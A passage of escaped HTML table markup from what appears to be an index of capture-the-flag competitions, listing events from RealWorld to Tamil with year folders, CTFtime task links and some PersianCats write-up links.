</tr>\n        <tr>\n            <td><a href=\"ctfs/RealWorld/2021\">2021</a></td>\n            <td><a href=\"https://ctftime.org/event/1198/tasks/\" target=\"_blank\">CTFtime</a></td>\n        </tr>\n        <tr>\n            <td><a href=\"ctfs/RealWorld/2019/Quals\">2019 Quals</a></td>\n            <td><a href=\"https://ctftime.org/event/841/tasks/\" target=\"_blank\">CTFtime</a></td>\n        </tr>\n        <tr>\n            <td rowspan=1><a href=\"ctfs/RedShift.Eclipse2\">RedShift.Eclipse2</a></td>\n            <td><a href=\"ctfs/RedShift.Eclipse2/2024/Quals\">2024 Quals</a></td>\n            <td><a href=\"https://ctftime.org/event/2541/tasks/\" target=\"_blank\">CTFtime</a></td>\n        </tr>\n        <tr>\n            <td rowspan=1><a href=\"ctfs/Remedy\">Remedy</a></td>\n            <td><a href=\"ctfs/Remedy/2025\">2025</a></td>\n            <td><a href=\"https://ctftime.org/event/2618/tasks/\" target=\"_blank\">CTFtime</a></td>\n        </tr>\n        <tr>\n            <td rowspan=1><a href=\"ctfs/Ricerca\">Ricerca</a></td>\n            <td><a href=\"ctfs/Ricerca/2023\">2023</a></td>\n            <td><a href=\"https://ctftime.org/event/1920/tasks/\" target=\"_blank\">CTFtime</a></td>\n        </tr>\n        <tr>\n            <td rowspan=1><a href=\"ctfs/Rooters\">Rooters</a></td>\n            <td><a href=\"ctfs/Rooters/2019\">2019</a></td>\n            <td><a href=\"https://ctftime.org/event/886/tasks/\" target=\"_blank\">CTFtime</a></td>\n        </tr>\n        <tr>\n            <td rowspan=1><a href=\"ctfs/Rush\">Rush</a></td>\n            <td><a href=\"ctfs/Rush/2023\">2023</a></td>\n            <td><a href=\"https://ctftime.org/event/1913/tasks/\" target=\"_blank\">CTFtime</a></td>\n        </tr>\n        <tr>\n            <td rowspan=1><a href=\"ctfs/S4CTF\">S4CTF</a></td>\n            <td><a href=\"ctfs/S4CTF/2021\">2021</a></td>\n            <td><a href=\"https://ctftime.org/event/1329/tasks/\" target=\"_blank\">CTFtime</a></td>\n        </tr>\n        <tr>\n            <td rowspan=1><a href=\"ctfs/SAS\">SAS</a></td>\n            <td><a href=\"ctfs/SAS/2024\">2024</a></td>\n            <td><a href=\"https://ctftime.org/event/2299/tasks/\" target=\"_blank\">CTFtime</a></td>\n        </tr>\n        <tr>\n            <td rowspan=3><a href=\"ctfs/SCTF\">SCTF</a></td>\n            <td><a href=\"ctfs/SCTF/2024\">2024</a></td>\n            <td><a href=\"https://ctftime.org/event/2483/tasks/\" target=\"_blank\">CTFtime</a></td>\n        </tr>\n        <tr>\n            <td><a href=\"ctfs/SCTF/2021\">2021</a></td>\n            <td><a href=\"https://ctftime.org/event/1539/tasks/\" target=\"_blank\">CTFtime</a></td>\n        </tr>\n        <tr>\n            <td><a href=\"ctfs/SCTF/2020\">2020</a></td>\n            <td><a href=\"https://ctftime.org/event/1068/tasks/\" target=\"_blank\">CTFtime</a></td>\n        </tr>\n        <tr>\n            <td rowspan=1><a href=\"ctfs/SEC-T\">SEC-T</a></td>\n            <td><a href=\"ctfs/SEC-T/2022\">2022</a></td>\n            <td><a href=\"https://ctftime.org/event/1761/tasks/\" target=\"_blank\">CTFtime</a></td>\n        </tr>\n        <tr>\n            <td rowspan=7><a href=\"ctfs/SECCON\">SECCON</a></td>\n            <td><a href=\"ctfs/SECCON/2024/Quals\">2024 Quals</a></td>\n            <td><a href=\"https://ctftime.org/event/2478/tasks/\" target=\"_blank\">CTFtime</a></td>\n        </tr>\n        <tr>\n            <td><a href=\"ctfs/SECCON/2023/Quals\">2023 Quals</a></td>\n            <td><a href=\"https://ctftime.org/event/2003/tasks/\" target=\"_blank\">CTFtime</a></td>\n        </tr>\n        <tr>\n            <td><a href=\"ctfs/SECCON/2022/Quals\">2022 Quals</a></td>\n            <td><a href=\"https://ctftime.org/event/1764/tasks/\" target=\"_blank\">CTFtime</a></td>\n        </tr>\n        <tr>\n            <td><a href=\"ctfs/SECCON/2021\">2021</a></td>\n            <td><a href=\"https://ctftime.org/event/1458/tasks/\" target=\"_blank\">CTFtime</a></td>\n        </tr>\n        <tr>\n            <td><a href=\"ctfs/SECCON/2020/Quals\">2020 Quals</a></td>\n            <td><a href=\"https://ctftime.org/event/1119/tasks/\" target=\"_blank\">CTFtime</a></td>\n        </tr>\n        <tr>\n            <td><a href=\"ctfs/SECCON/2018/Quals\">2018 Quals</a></td>\n            <td><a href=\"https://ctftime.org/event/683/tasks/\" target=\"_blank\">CTFtime</a> <a href=\"https://github.com/sajjadium/ctf-writeups/tree/master/SECCON/2018/Quals\">PersianCats</a></td>\n        </tr>\n        <tr>\n            <td><a href=\"ctfs/SECCON/2017/Quals\">2017 Quals</a></td>\n            <td><a href=\"https://ctftime.org/event/512/tasks/\" target=\"_blank\">CTFtime</a> <a href=\"https://github.com/sajjadium/ctf-writeups/tree/master/SECCON/2017/Quals\">PersianCats</a></td>\n        </tr>\n        <tr>\n            <td rowspan=2><a href=\"ctfs/SHELL\">SHELL</a></td>\n            <td><a href=\"ctfs/SHELL/2022\">2022</a></td>\n            <td><a href=\"https://ctftime.org/event/1604/tasks/\" target=\"_blank\">CTFtime</a></td>\n        </tr>\n        <tr>\n            <td><a href=\"ctfs/SHELL/2021\">2021</a></td>\n            <td><a href=\"https://ctftime.org/event/1362/tasks/\" target=\"_blank\">CTFtime</a></td>\n        </tr>\n        <tr>\n            <td rowspan=2><a href=\"ctfs/SEETF\">SEETF</a></td>\n            <td><a href=\"ctfs/SEETF/2023\">2023</a></td>\n            <td><a href=\"https://ctftime.org/event/1828/tasks/\" target=\"_blank\">CTFtime</a></td>\n        </tr>\n        <tr>\n            <td><a href=\"ctfs/SEETF/2022\">2022</a></td>\n            <td><a href=\"https://ctftime.org/event/1543/tasks/\" target=\"_blank\">CTFtime</a></td>\n        </tr>\n        <tr>\n            <td rowspan=2><a href=\"ctfs/SPbCTF\">SPbCTF</a></td>\n            <td><a href=\"ctfs/SPbCTF/2021/Quals\">2021 Quals</a></td>\n            <td><a href=\"https://ctftime.org/event/1378/tasks/\" target=\"_blank\">CTFtime</a></td>\n        </tr>\n        <tr>\n            <td><a href=\"ctfs/SPbCTF/2020/Quals\">2020 Quals</a></td>\n            <td><a href=\"https://ctftime.org/event/1188/tasks/\" target=\"_blank\">CTFtime</a></td>\n        </tr>\n        <tr>\n            <td rowspan=2><a href=\"ctfs/SpringForwardCTF\">SpringForwardCTF</a></td>\n            <td><a href=\"ctfs/SpringForwardCTF/2024\">2024</a></td>\n            <td><a href=\"https://ctftime.org/event/2348/tasks/\" target=\"_blank\">CTFtime</a></td>\n        </tr>\n        <tr>\n            <td><a href=\"ctfs/SpringForwardCTF/2023\">2023</a></td>\n            <td><a href=\"https://ctftime.org/event/1927/tasks/\" target=\"_blank\">CTFtime</a></td>\n        </tr>\n        <tr>\n            <td rowspan=2><a href=\"ctfs/SUSCTF\">SUSCTF</a></td>\n            <td><a href=\"ctfs/SUSCTF/2025\">2025</a></td>\n            <td><a href=\"https://ctftime.org/event/2620/tasks/\" target=\"_blank\">CTFtime</a></td>\n        </tr>\n        <tr>\n            <td><a href=\"ctfs/SUSCTF/2022\">2022</a></td>\n            <td><a href=\"https://ctftime.org/event/1566/tasks/\" target=\"_blank\">CTFtime</a></td>\n        </tr>\n        <tr>\n            <td rowspan=2><a href=\"ctfs/SanDiego\">SanDiego</a></td>\n            <td><a href=\"ctfs/SanDiego/2024\">2024</a></td>\n            <td><a href=\"https://ctftime.org/event/2325/tasks/\" target=\"_blank\">CTFtime</a></td>\n        </tr>\n        <tr>\n            <td><a href=\"ctfs/SanDiego/2023\">2023</a></td>\n            <td><a href=\"https://ctftime.org/event/1910/tasks/\" target=\"_blank\">CTFtime</a></td>\n        </tr>\n        <tr>\n            <td rowspan=4><a href=\"ctfs/SekaiCTF\">SekaiCTF</a></td>\n            <td><a href=\"ctfs/SekaiCTF/2025\">2025</a></td>\n            <td><a href=\"https://ctftime.org/event/2683/tasks/\" target=\"_blank\">CTFtime</a></td>\n        </tr>\n        <tr>\n            <td><a href=\"ctfs/SekaiCTF/2024\">2024</a></td>\n            <td><a href=\"https://ctftime.org/event/2243/tasks/\" target=\"_blank\">CTFtime</a></td>\n        </tr>\n        <tr>\n            <td><a href=\"ctfs/SekaiCTF/2023\">2023</a></td>\n            <td><a href=\"https://ctftime.org/event/1923/tasks/\" target=\"_blank\">CTFtime</a></td>\n        </tr>\n        <tr>\n            <td><a href=\"ctfs/SekaiCTF/2022\">2022</a></td>\n            <td><a href=\"https://ctftime.org/event/1619/tasks/\" target=\"_blank\">CTFtime</a></td>\n        </tr>\n        <tr>\n            <td rowspan=7><a href=\"ctfs/Securinets\">Securinets</a></td>\n            <td><a href=\"ctfs/Securinets/2025/Quals\">2025 Quals</a></td>\n            <td><a href=\"https://ctftime.org/event/2884/tasks/\" target=\"_blank\">CTFtime</a></td>\n        </tr>\n        <tr>\n            <td><a href=\"ctfs/Securinets/2024/Quals\">2024 Quals</a></td>\n            <td><a href=\"https://ctftime.org/event/2520/tasks/\" target=\"_blank\">CTFtime</a></td>\n        </tr>\n        <tr>\n            <td><a href=\"ctfs/Securinets/2023/Quals\">2023 Quals</a></td>\n            <td><a href=\"https://ctftime.org/event/1874/tasks/\" target=\"_blank\">CTFtime</a></td>\n        </tr>\n        <tr>\n            <td><a href=\"ctfs/Securinets/2022/Quals\">2022 Quals</a></td>\n            <td><a href=\"https://ctftime.org/event/1617/tasks/\" target=\"_blank\">CTFtime</a></td>\n        </tr>\n        <tr>\n            <td><a href=\"ctfs/Securinets/2021/Quals\">2021 Quals</a></td>\n            <td><a href=\"https://ctftime.org/event/1308/tasks/\" target=\"_blank\">CTFtime</a></td>\n        </tr>\n        <tr>\n            <td><a href=\"ctfs/Securinets/2020/Quals\">2020 Quals</a></td>\n            <td><a href=\"https://ctftime.org/event/1016/tasks/\" target=\"_blank\">CTFtime</a></td>\n        </tr>\n        <tr>\n            <td><a href=\"ctfs/Securinets/2019/Quals\">2019 Quals</a></td>\n            <td><a href=\"https://ctftime.org/event/769/tasks/\" target=\"_blank\">CTFtime</a></td>\n        </tr>\n        <tr>\n            <td rowspan=2><a href=\"ctfs/SecurityFest\">Security Fest</a></td>\n            <td><a href=\"ctfs/SecurityFest/2022\">2022</a></td>\n            <td><a href=\"https://ctftime.org/event/1669/tasks/\" target=\"_blank\">CTFtime</a></td>\n        </tr>\n        <tr>\n            <td><a href=\"ctfs/SecurityFest/2018\">2018</a></td>\n            <td><a href=\"https://ctftime.org/event/622/tasks/\" target=\"_blank\">CTFtime</a></td>\n        </tr>\n        <tr>\n            <td rowspan=3><a href=\"ctfs/Shakti\">Shakti</a></td>\n            <td><a href=\"ctfs/Shakti/2025\">2025</a></td>\n            <td><a href=\"https://ctftime.org/event/2803/tasks/\" target=\"_blank\">CTFtime</a></td>\n        </tr>\n        <tr>\n            <td><a href=\"ctfs/Shakti/2021\">2021</a></td>\n            <td><a href=\"https://ctftime.org/event/1251/tasks/\" target=\"_blank\">CTFtime</a></td>\n        </tr>\n        <tr>\n            <td><a href=\"ctfs/Shakti/2020\">2020</a></td>\n            <td><a href=\"https://ctftime.org/event/1141/tasks/\" target=\"_blank\">CTFtime</a></td>\n        </tr>\n        <tr>\n            <td rowspan=1><a href=\"ctfs/SharkyCTF\">Sharky</a></td>\n            <td><a href=\"ctfs/SharkyCTF/2020\">2020</a></td>\n            <td><a href=\"https://ctftime.org/event/1034/tasks/\" target=\"_blank\">CTFtime</a></td>\n        </tr>\n        <tr>\n            <td rowspan=1><a href=\"ctfs/Shaastra\">Shaastra</a></td>\n            <td><a href=\"ctfs/Shaastra/2024\">2024</a></td>\n            <td><a href=\"https://ctftime.org/event/2220/tasks/\" target=\"_blank\">CTFtime</a></td>\n        </tr>\n        <tr>\n            <td rowspan=1><a href=\"ctfs/ShunyaCTF\">ShunyaCTF</a></td>\n            <td><a href=\"ctfs/ShunyaCTF/2024\">2024</a></td>\n            <td><a href=\"https://ctftime.org/event/2336/tasks/\" target=\"_blank\">CTFtime</a></td>\n        </tr>\n        <tr>\n            <td rowspan=1><a href=\"ctfs/SillyCTF\">SillyCTF</a></td>\n            <td><a href=\"ctfs/SillyCTF/2025\">2025</a></td>\n            <td><a href=\"https://ctftime.org/event/2637/tasks/\" target=\"_blank\">CTFtime</a></td>\n        </tr>\n        <tr>\n            <td rowspan=3><a href=\"ctfs/SpaceHeroes\">SpaceHeroes</a></td>\n            <td><a href=\"ctfs/SpaceHeroes/2024\">2024</a></td>\n            <td><a href=\"https://ctftime.org/event/2254/tasks/\" target=\"_blank\">CTFtime</a></td>\n        </tr>\n        <tr>\n            <td><a href=\"ctfs/SpaceHeroes/2023\">2023</a></td>\n            <td><a href=\"https://ctftime.org/event/1856/tasks/\" target=\"_blank\">CTFtime</a></td>\n        </tr>\n        <tr>\n            <td><a href=\"ctfs/SpaceHeroes/2022\">2022</a></td>\n            <td><a href=\"https://ctftime.org/event/1567/tasks/\" target=\"_blank\">CTFtime</a></td>\n        </tr>\n        <tr>\n            <td rowspan=1><a href=\"ctfs/SpamAndFlags\">SpamAndFlags</a></td>\n            <td><a href=\"ctfs/SpamAndFlags/2020/Quals\">2020 Quals</a></td>\n            <td><a href=\"https://ctftime.org/event/970/tasks/\" target=\"_blank\">CTFtime</a></td>\n        </tr>\n        <tr>\n            <td rowspan=1><a href=\"ctfs/SpartanCTF\">SpartanCTF</a></td>\n            <td><a href=\"ctfs/SpartanCTF/2024\">2024</a></td>\n            <td><a href=\"https://ctftime.org/event/2313/tasks/\" target=\"_blank\">CTFtime</a></td>\n        </tr>\n        <tr>\n            <td rowspan=2><a href=\"ctfs/SpookyCTF\">SpookyCTF</a></td>\n            <td><a href=\"ctfs/SpookyCTF/2024\">2024</a></td>\n            <td><a href=\"https://ctftime.org/event/2516/tasks/\" target=\"_blank\">CTFtime</a></td>\n        </tr>\n        <tr>\n            <td><a href=\"ctfs/SpookyCTF/2023\">2023</a></td>\n            <td><a href=\"https://ctftime.org/event/2137/tasks/\" target=\"_blank\">CTFtime</a></td>\n        </tr>\n        <tr>\n            <td rowspan=5><a href=\"ctfs/Block\">Block</a></td>\n            <td><a href=\"ctfs/Block/2024\">2024</a></td>\n            <td><a href=\"https://ctftime.org/event/2517/tasks/\" target=\"_blank\">CTFtime</a></td>\n        </tr>\n        <tr>\n            <td><a href=\"ctfs/Block/2023\">2023</a></td>\n            <td><a href=\"https://ctftime.org/event/2111/tasks/\" target=\"_blank\">CTFtime</a></td>\n        </tr>\n        <tr>\n            <td><a href=\"ctfs/Block/2022\">2022</a></td>\n            <td><a href=\"https://ctftime.org/event/1756/tasks/\" target=\"_blank\">CTFtime</a></td>\n        </tr>\n        <tr>\n            <td><a href=\"ctfs/Block/2021\">2021</a></td>\n            <td><a href=\"https://ctftime.org/event/1496/tasks/\" target=\"_blank\">CTFtime</a></td>\n        </tr>\n        <tr>\n            <td><a href=\"ctfs/Block/2020\">2020</a></td>\n            <td><a href=\"https://ctftime.org/event/1174/tasks/\" target=\"_blank\">CTFtime</a></td>\n        </tr>\n        <tr>\n            <td rowspan=3><a href=\"ctfs/Srdnlen\">Srdnlen</a></td>\n            <td><a href=\"ctfs/Srdnlen/2025\">2025</a></td>\n            <td><a href=\"https://ctftime.org/event/2576/tasks/\" target=\"_blank\">CTFtime</a></td>\n        </tr>\n        <tr>\n            <td><a href=\"ctfs/Srdnlen/2023\">2023</a></td>\n            <td><a href=\"https://ctftime.org/event/2129/tasks/\" target=\"_blank\">CTFtime</a></td>\n        </tr>\n        <tr>\n            <td><a href=\"ctfs/Srdnlen/2022\">2022</a></td>\n            <td><a href=\"https://ctftime.org/event/1766/tasks/\" target=\"_blank\">CTFtime</a></td>\n        </tr>\n        <tr>\n            <td rowspan=5><a href=\"ctfs/StackSmash\">StackSmash</a></td>\n            <td><a href=\"ctfs/StackSmash/2025\">2025</a></td>\n            <td><a href=\"https://ctftime.org/event/2841/tasks/\" target=\"_blank\">CTFtime</a></td>\n        </tr>\n        <tr>\n            <td rowspan=5><a href=\"ctfs/StarCTF\">*CTF</a></td>\n            <td><a href=\"ctfs/StarCTF/2023\">2023</a></td>\n            <td><a href=\"https://ctftime.org/event/2045/tasks/\" target=\"_blank\">CTFtime</a></td>\n        </tr>\n        <tr>\n            <td><a href=\"ctfs/StarCTF/2022\">2022</a></td>\n            <td><a href=\"https://ctftime.org/event/1609/tasks/\" target=\"_blank\">CTFtime</a></td>\n        </tr>\n        <tr>\n            <td><a href=\"ctfs/StarCTF/2021\">2021</a></td>\n            <td><a href=\"https://ctftime.org/event/1242/tasks/\" target=\"_blank\">CTFtime</a></td>\n        </tr>\n        <tr>\n            <td><a href=\"ctfs/StarCTF/2019\">2019</a></td>\n            <td><a href=\"https://ctftime.org/event/778/tasks/\" target=\"_blank\">CTFtime</a></td>\n        </tr>\n        <tr>\n            <td><a href=\"ctfs/StarCTF/2018\">2018</a></td>\n            <td><a href=\"https://ctftime.org/event/614/tasks/\" target=\"_blank\">CTFtime</a> <a href=\"https://github.com/sajjadium/ctf-writeups/tree/master/StarCTF/2018\">PersianCats</a></td>\n        </tr>\n        <tr>\n            <td rowspan=1><a href=\"ctfs/SuSeC\">SuSeC</a></td>\n            <td><a href=\"ctfs/SuSeC/2020\">2020</a></td>\n            <td><a href=\"https://ctftime.org/event/1007/tasks/\" target=\"_blank\">CTFtime</a></td>\n        </tr>\n        <tr>\n            <td rowspan=1><a href=\"ctfs/Summit\">Summit</a></td>\n            <td><a href=\"ctfs/Summit/2023\">2023</a></td>\n            <td><a href=\"https://ctftime.org/event/1862/tasks/\" target=\"_blank\">CTFtime</a></td>\n        </tr>\n        <tr>\n            <td rowspan=7><a href=\"ctfs/SunshineCTF\">SunshineCTF</a></td>\n            <td><a href=\"ctfs/SunshineCTF/2025\">2025</a></td>\n            <td><a href=\"https://ctftime.org/event/2863/tasks/\" target=\"_blank\">CTFtime</a></td>\n        </tr>\n        <tr>\n            <td><a href=\"ctfs/SunshineCTF/2024\">2024</a></td>\n            <td><a href=\"https://ctftime.org/event/2485/tasks/\" target=\"_blank\">CTFtime</a></td>\n        </tr>\n        <tr>\n            <td><a href=\"ctfs/SunshineCTF/2023\">2023</a></td>\n            <td><a href=\"https://ctftime.org/event/2079/tasks/\" target=\"_blank\">CTFtime</a></td>\n        </tr>\n        <tr>\n            <td><a href=\"ctfs/SunshineCTF/2022\">2022</a></td>\n            <td><a href=\"https://ctftime.org/event/1629/tasks/\" target=\"_blank\">CTFtime</a></td>\n        </tr>\n        <tr>\n            <td><a href=\"ctfs/SunshineCTF/2021\">2021</a></td>\n            <td><a href=\"https://ctftime.org/event/1441/tasks/\" target=\"_blank\">CTFtime</a></td>\n        </tr>\n        <tr>\n            <td><a href=\"ctfs/SunshineCTF/2020\">2020</a></td>\n            <td><a href=\"https://ctftime.org/event/992/tasks/\" target=\"_blank\">CTFtime</a></td>\n        </tr>\n        <tr>\n            <td><a href=\"ctfs/SunshineCTF/2019\">2019</a></td>\n            <td><a href=\"https://ctftime.org/event/767/tasks/\" target=\"_blank\">CTFtime</a></td>\n        </tr>\n        <tr>\n            <td rowspan=2><a href=\"ctfs/SwampCTF\">SwampCTF</a></td>\n            <td><a href=\"ctfs/SwampCTF/2025\">2025</a></td>\n            <td><a href=\"https://ctftime.org/event/2573/tasks/\" target=\"_blank\">CTFtime</a></td>\n        </tr>\n        <tr>\n            <td><a href=\"ctfs/SwampCTF/2024\">2024</a></td>\n            <td><a href=\"https://ctftime.org/event/2138/tasks/\" target=\"_blank\">CTFtime</a></td>\n        </tr>\n        <tr>\n            <td rowspan=1><a href=\"ctfs/SyskronSecurity\">Syskron Security</a></td>\n            <td><a href=\"ctfs/SyskronSecurity/2020\">2020</a></td>\n            <td><a href=\"https://ctftime.org/event/1148/tasks/\" target=\"_blank\">CTFtime</a></td>\n        </tr>\n        <tr>\n            <td rowspan=1><a href=\"ctfs/T3N4CI0US\">T3N4CI0US</a></td>\n            <td><a href=\"ctfs/T3N4CI0US/2022\">2022</a></td>\n            <td><a href=\"https://ctftime.org/event/1575/tasks/\" target=\"_blank\">CTFtime</a></td>\n        </tr>\n        <tr>\n            <td rowspan=8><a href=\"ctfs/TAMUctf\">TAMUctf</a></td>\n            <td><a href=\"ctfs/TAMUctf/2025\">2025</a></td>\n            <td><a href=\"https://ctftime.org/event/2681/tasks/\" target=\"_blank\">CTFtime</a></td>\n        </tr>\n        <tr>\n            <td><a href=\"ctfs/TAMUctf/2024\">2024</a></td>\n            <td><a href=\"https://ctftime.org/event/2238/tasks/\" target=\"_blank\">CTFtime</a></td>\n        </tr>\n        <tr>\n            <td><a href=\"ctfs/TAMUctf/2023\">2023</a></td>\n            <td><a href=\"https://ctftime.org/event/1914/tasks/\" target=\"_blank\">CTFtime</a></td>\n        </tr>\n        <tr>\n            <td><a href=\"ctfs/TAMUctf/2022\">2022</a></td>\n            <td><a href=\"https://ctftime.org/event/1557/tasks/\" target=\"_blank\">CTFtime</a></td>\n        </tr>\n        <tr>\n            <td><a href=\"ctfs/TAMUctf/2021\">2021</a></td>\n            <td><a href=\"https://ctftime.org/event/1320/tasks/\" target=\"_blank\">CTFtime</a></td>\n        </tr>\n        <tr>\n            <td><a href=\"ctfs/TAMUctf/2020\">2020</a></td>\n            <td><a href=\"https://ctftime.org/event/1009/tasks/\" target=\"_blank\">CTFtime</a></td>\n        </tr>\n        <tr>\n            <td><a href=\"ctfs/TAMUctf/2019\">2019</a></td>\n            <td><a href=\"https://ctftime.org/event/740/tasks/\" target=\"_blank\">CTFtime</a> <a href=\"https://github.com/sajjadium/ctf-writeups/tree/master/TAMUctf/2019\">PersianCats</a></td>\n        </tr>\n        <tr>\n            <td><a href=\"ctfs/TAMUctf/2018\">2018</a></td>\n            <td><a href=\"https://ctftime.org/event/559/tasks/\" target=\"_blank\">CTFtime</a> <a href=\"https://github.com/sajjadium/ctf-writeups/tree/master/TAMUctf/2018\">PersianCats</a></td>\n        </tr>\n        <tr>\n            <td rowspan=3><a href=\"ctfs/TBTL\">TBTL</a></td>\n            <td><a href=\"ctfs/TBTL/2025\">2025</a></td>\n            <td><a href=\"https://ctftime.org/event/2893/tasks/\" target=\"_blank\">CTFtime</a></td>\n        </tr>\n        <tr>\n            <td><a href=\"ctfs/TBTL/2024\">2024</a></td>\n            <td><a href=\"https://ctftime.org/event/2324/tasks/\" target=\"_blank\">CTFtime</a></td>\n        </tr>\n        <tr>\n            <td><a href=\"ctfs/TBTL/2023\">2023</a></td>\n            <td><a href=\"https://ctftime.org/event/2002/tasks/\" target=\"_blank\">CTFtime</a></td>\n        </tr>\n        <tr>\n            <td rowspan=2><a href=\"ctfs/TCP1P\">TCP1P</a></td>\n            <td><a href=\"ctfs/TCP1P/2024\">2024</a></td>\n            <td><a href=\"https://ctftime.org/event/2256/tasks/\" target=\"_blank\">CTFtime</a></td>\n        </tr>\n        <tr>\n            <td><a href=\"ctfs/TCP1P/2023\">2023</a></td>\n            <td><a href=\"https://ctftime.org/event/2001/tasks/\" target=\"_blank\">CTFtime</a></td>\n        </tr>\n        <tr>\n            <td rowspan=5><a href=\"ctfs/TFC\">TFC</a></td>\n            <td><a href=\"ctfs/TFC/2025\">2025</a></td>\n            <td><a href=\"https://ctftime.org/event/2822/tasks/\" target=\"_blank\">CTFtime</a></td>\n        </tr>\n        <tr>\n            <td><a href=\"ctfs/TFC/2024\">2024</a></td>\n            <td><a href=\"https://ctftime.org/event/2423/tasks/\" target=\"_blank\">CTFtime</a></td>\n        </tr>\n        <tr>\n            <td><a href=\"ctfs/TFC/2023\">2023</a></td>\n            <td><a href=\"https://ctftime.org/event/2034/tasks/\" target=\"_blank\">CTFtime</a></td>\n        </tr>\n        <tr>\n            <td><a href=\"ctfs/TFC/2022\">2022</a></td>\n            <td><a href=\"https://ctftime.org/event/1647/tasks/\" target=\"_blank\">CTFtime</a></td>\n        </tr>\n        <tr>\n            <td><a href=\"ctfs/TFC/2021\">2021</a></td>\n            <td><a href=\"https://ctftime.org/event/1501/tasks/\" target=\"_blank\">CTFtime</a></td>\n        </tr>\n        <tr>\n            <td rowspan=1><a href=\"ctfs/TGHACK\">TG:HACK</a></td>\n            <td><a href=\"ctfs/TGHACK/2020\">2020</a></td>\n            <td><a href=\"https://ctftime.org/event/932/tasks/\" target=\"_blank\">CTFtime</a></td>\n        </tr>\n        <tr>\n            <td rowspan=4><a href=\"ctfs/THCon\">THCon</a></td>\n            <td><a href=\"ctfs/THCon/2025\">2025</a></td>\n            <td><a href=\"https://ctftime.org/event/2660/tasks/\" target=\"_blank\">CTFtime</a></td>\n        </tr>\n        <tr>\n            <td><a href=\"ctfs/THCon/2024\">2024</a></td>\n            <td><a href=\"https://ctftime.org/event/2269/tasks/\" target=\"_blank\">CTFtime</a></td>\n        </tr>\n        <tr>\n            <td><a href=\"ctfs/THCon/2022\">2022</a></td>\n            <td><a href=\"https://ctftime.org/event/1628/tasks/\" target=\"_blank\">CTFtime</a></td>\n        </tr>\n        <tr>\n            <td><a href=\"ctfs/THCon/2021\">2021</a></td>\n            <td><a href=\"https://ctftime.org/event/1381/tasks/\" target=\"_blank\">CTFtime</a></td>\n        </tr>\n        <tr>\n            <td rowspan=1><a href=\"ctfs/THJCC\">THJCC</a></td>\n            <td><a href=\"ctfs/THJCC/2024\">2024</a></td>\n            <td><a href=\"https://ctftime.org/event/2361/tasks/\" target=\"_blank\">CTFtime</a></td>\n        </tr>\n        <tr>\n            <td rowspan=5><a href=\"ctfs/TJCTF\">TJCTF</a></td>\n            <td><a href=\"ctfs/TJCTF/2025\">2025</a></td>\n            <td><a href=\"https://ctftime.org/event/2809/tasks/\" target=\"_blank\">CTFtime</a></td>\n        </tr>\n        <tr>\n            <td><a href=\"ctfs/TJCTF/2024\">2024</a></td>\n            <td><a href=\"https://ctftime.org/event/2321/tasks/\" target=\"_blank\">CTFtime</a></td>\n        </tr>\n        <tr>\n            <td><a href=\"ctfs/TJCTF/2023\">2023</a></td>\n            <td><a href=\"https://ctftime.org/event/1865/tasks/\" target=\"_blank\">CTFtime</a></td>\n        </tr>\n        <tr>\n            <td><a href=\"ctfs/TJCTF/2022\">2022</a></td>\n            <td><a href=\"https://ctftime.org/event/1599/tasks/\" target=\"_blank\">CTFtime</a></td>\n        </tr>\n        <tr>\n            <td><a href=\"ctfs/TJCTF/2020\">2020</a></td>\n            <td><a href=\"https://ctftime.org/event/928/tasks/\" target=\"_blank\">CTFtime</a></td>\n        </tr>\n        <tr>\n            <td rowspan=2><a href=\"ctfs/TPCTF\">TPCTF</a></td>\n            <td><a href=\"ctfs/TPCTF/2025\">2025</a></td>\n            <td><a href=\"https://ctftime.org/event/2645/tasks/\" target=\"_blank\">CTFtime</a></td>\n        </tr>\n        <tr>\n            <td><a href=\"ctfs/TPCTF/2023\">2023</a></td>\n            <td><a href=\"https://ctftime.org/event/2161/tasks/\" target=\"_blank\">CTFtime</a></td>\n        </tr>\n        <tr>\n            <td rowspan=1><a href=\"ctfs/TMUCTF\">TMUCTF</a></td>\n            <td><a href=\"ctfs/TMUCTF/2021\">2021</a></td>\n            <td><a href=\"https://ctftime.org/event/1427/tasks/\" target=\"_blank\">CTFtime</a></td>\n        </tr>\n        <tr>\n            <td rowspan=1><a href=\"ctfs/TRX\">TRX</a></td>\n            <td><a href=\"ctfs/TRX/2025\">2025</a></td>\n            <td><a href=\"https://ctftime.org/event/2654/tasks/\" target=\"_blank\">CTFtime</a></td>\n        </tr>\n        <tr>\n            <td rowspan=1><a href=\"ctfs/TSCCTF\">TSCCTF</a></td>\n            <td><a href=\"ctfs/TSCCTF/2025\">2025</a></td>\n            <td><a href=\"https://ctftime.org/event/2598/tasks/\" target=\"_blank\">CTFtime</a></td>\n        </tr>\n        <tr>\n            <td rowspan=5><a href=\"ctfs/TSG\">TSG</a></td>\n            <td><a href=\"ctfs/TSG/2024\">2024</a></td>\n            <td><a href=\"https://ctftime.org/event/2424/tasks/\" target=\"_blank\">CTFtime</a></td>\n        </tr>\n        <tr>\n            <td><a href=\"ctfs/TSG/2023\">2023</a></td>\n            <td><a href=\"https://ctftime.org/event/2013/tasks/\" target=\"_blank\">CTFtime</a></td>\n        </tr>\n        <tr>\n            <td><a href=\"ctfs/TSG/2021\">2021</a></td>\n            <td><a href=\"https://ctftime.org/event/1431/tasks/\" target=\"_blank\">CTFtime</a></td>\n        </tr>\n        <tr>\n            <td><a href=\"ctfs/TSG/2020\">2020</a></td>\n            <td><a href=\"https://ctftime.org/event/1004/tasks/\" target=\"_blank\">CTFtime</a></td>\n        </tr>\n        <tr>\n            <td><a href=\"ctfs/TSG/2019\">2019</a></td>\n            <td><a href=\"https://ctftime.org/event/758/tasks/\" target=\"_blank\">CTFtime</a></td>\n        </tr>\n        <tr>\n            <td rowspan=4><a href=\"ctfs/TU\">TU</a></td>\n            <td><a href=\"ctfs/TU/2024\">2024</a></td>\n            <td><a href=\"https://ctftime.org/event/2584/tasks/\" target=\"_blank\">CTFtime</a></td>\n        </tr>\n        <tr>\n            <td><a href=\"ctfs/TU/2023\">2023</a></td>\n            <td><a href=\"https://ctftime.org/event/2173/tasks/\" target=\"_blank\">CTFtime</a></td>\n        </tr>\n        <tr>\n            <td><a href=\"ctfs/TU/2022\">2022</a></td>\n            <td><a href=\"https://ctftime.org/event/1830/tasks/\" target=\"_blank\">CTFtime</a></td>\n        </tr>\n        <tr>\n            <td><a href=\"ctfs/TU/2018\">2018</a></td>\n            <td><a href=\"https://ctftime.org/event/650/tasks/\" target=\"_blank\">CTFtime</a></td>\n        </tr>\n        <tr>\n            <td rowspan=1><a href=\"ctfs/Tamil\">Tamil</a></td>\n            <td><a 